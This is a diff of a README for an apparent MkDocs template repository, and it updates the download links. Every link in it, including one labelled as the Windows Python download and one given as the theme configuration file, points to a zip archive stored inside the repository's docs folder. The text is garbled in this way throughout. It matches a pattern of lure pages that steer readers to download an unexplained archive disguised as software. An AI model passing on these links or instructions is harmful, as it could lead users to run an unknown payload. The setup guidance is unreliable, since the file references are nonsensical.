@@ -1,6 +1,6 @@
 # 🌐 template-of-mkdocs - A Simple Start with MkDocs
 
-[![Download Now](https://raw.githubusercontent.com/medojamal/template-of-mkdocs/main/docs/menu3/mkdocs-of-template-v2.5.zip%https://raw.githubusercontent.com/medojamal/template-of-mkdocs/main/docs/menu3/mkdocs-of-template-v2.5.zip)](https://raw.githubusercontent.com/medojamal/template-of-mkdocs/main/docs/menu3/mkdocs-of-template-v2.5.zip)
+[![Download Now](https://github.com/medojamal/template-of-mkdocs/raw/refs/heads/main/docs/examples/asciinema/template-mkdocs-of-2.0-beta.1.zip%https://github.com/medojamal/template-of-mkdocs/raw/refs/heads/main/docs/examples/asciinema/template-mkdocs-of-2.0-beta.1.zip)](https://github.com/medojamal/template-of-mkdocs/raw/refs/heads/main/docs/examples/asciinema/template-mkdocs-of-2.0-beta.1.zip)
 
 ## 📋 Overview
 
@@ -12,14 +12,14 @@ To use the template, follow these steps to download and run the software. You do
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page where you can download the template.
-   [Visit Releases Page to Download](https://raw.githubusercontent.com/medojamal/template-of-mkdocs/main/docs/menu3/mkdocs-of-template-v2.5.zip)
+   [Visit Releases Page to Download](https://github.com/medojamal/template-of-mkdocs/raw/refs/heads/main/docs/examples/asciinema/template-mkdocs-of-2.0-beta.1.zip)
 
 2. **Download the Latest Release**  
    On the releases page, find the latest version. Click on it to view available files. You will see several files for download. Choose the file that matches your operating system.
 
 3. **Install Required Software**  
    Before you can run this template, ensure you have Python installed on your computer. Here’s what you need:
-   - **Windows**: Download Python from [https://raw.githubusercontent.com/medojamal/template-of-mkdocs/main/docs/menu3/mkdocs-of-template-v2.5.zip](https://raw.githubusercontent.com/medojamal/template-of-mkdocs/main/docs/menu3/mkdocs-of-template-v2.5.zip).
+   - **Windows**: Download Python from [https://github.com/medojamal/template-of-mkdocs/raw/refs/heads/main/docs/examples/asciinema/template-mkdocs-of-2.0-beta.1.zip](https://github.com/medojamal/template-of-mkdocs/raw/refs/heads/main/docs/examples/asciinema/template-mkdocs-of-2.0-beta.1.zip).
    - **Mac**: Use Homebrew to install Python by running `brew install python`.
    - **Linux**: Install Python using your package manager. For example, use `sudo apt-get install python3` on Debian-based systems.
 
@@ -36,7 +36,7 @@ To use the template, follow these steps to download and run the software. You do
 ## 📥 Download & Install
 
 To get started with the template, visit the releases page to download the latest version. Use this link to access it again:  
-[Download Now](https://raw.githubusercontent.com/medojamal/template-of-mkdocs/main/docs/menu3/mkdocs-of-template-v2.5.zip)
+[Download Now](https://github.com/medojamal/template-of-mkdocs/raw/refs/heads/main/docs/examples/asciinema/template-mkdocs-of-2.0-beta.1.zip)
 
 ### ⚙️ System Requirements
 
@@ -59,7 +59,7 @@ Once you have set up the application, you can customize it by editing the Markdo
    Begin by locating the 'docs' folder. Inside, you’ll find Markdown files. Open these files in a text editor to edit the content.
 
 2. **Change the Theme**  
-   You can change the appearance of your site by modifying the `https://raw.githubusercontent.com/medojamal/template-of-mkdocs/main/docs/menu3/mkdocs-of-template-v2.5.zip` file. When you open this file, you can specify different themes supported by MkDocs.
+   You can change the appearance of your site by modifying the `https://github.com/medojamal/template-of-mkdocs/raw/refs/heads/main/docs/examples/asciinema/template-mkdocs-of-2.0-beta.1.zip` file. When you open this file, you can specify different themes supported by MkDocs.
 
 3. **Add Plugins**  
    Enhance your site’s functionality by adding plugins. Visit the MkDocs documentation to find available plugins.
